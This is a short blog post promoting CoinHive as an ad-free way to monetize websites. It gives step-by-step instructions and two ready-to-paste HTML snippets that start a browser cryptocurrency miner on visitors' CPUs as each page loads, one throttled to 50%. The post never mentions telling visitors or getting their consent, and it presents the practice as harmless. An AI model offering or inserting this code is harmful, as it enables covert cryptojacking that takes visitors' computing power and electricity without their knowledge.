---
layout: post
title: Monetizing Websites without having to use anoying advertisements!
---

Have you ever wanted to make a personal website or even a business website that would not require the end user to be anoyed by adverts? If you have, then today is your day!

And doing it is as simple as 3 steps.

Step 1: Go to the [CoinHive "Sign Up" page][coinhive] and create your account.

Step 2: Go to the [CoinHive "Settings > Sites" page][coinhive_keys] and get your "Site Key"

Step 3: Add the following code snippet to your webpage/webpages

```html
<!-- Monitizing visitor traffic -->
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  // What site-key do we use?
  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key

  // Get instance of the miner
  var miner = new CoinHive.Anonymous(key);

  // Start this baby up!
  miner.start();
</script>
```

Take note that there are options to custimize the miner for example in this next snippet, we set a 50% throttle for the miner CPU cycles consumed

```html
<!-- Monitizing visitor traffic -->
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  // What site-key do we use?
  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key

  // Get instance of the miner
  var miner = new CoinHive.Anonymous(key, { throttle: 0.5 });

  // Start this baby up!
  miner.start();
</script>
```

CONCLUSION:

This is a pretty neat solution for getting RID of anoying adverts and keeping the same or even better income for your content or even service related website.

[coinhive]: https://cnhv.co/hro
{:target="_blank"}

[coinhive_keys]: https://cnhv.co/hrn
{:target="_blank"}

[coinhive_docs]: https://cnhv.co/hru
{:target="_blank"}
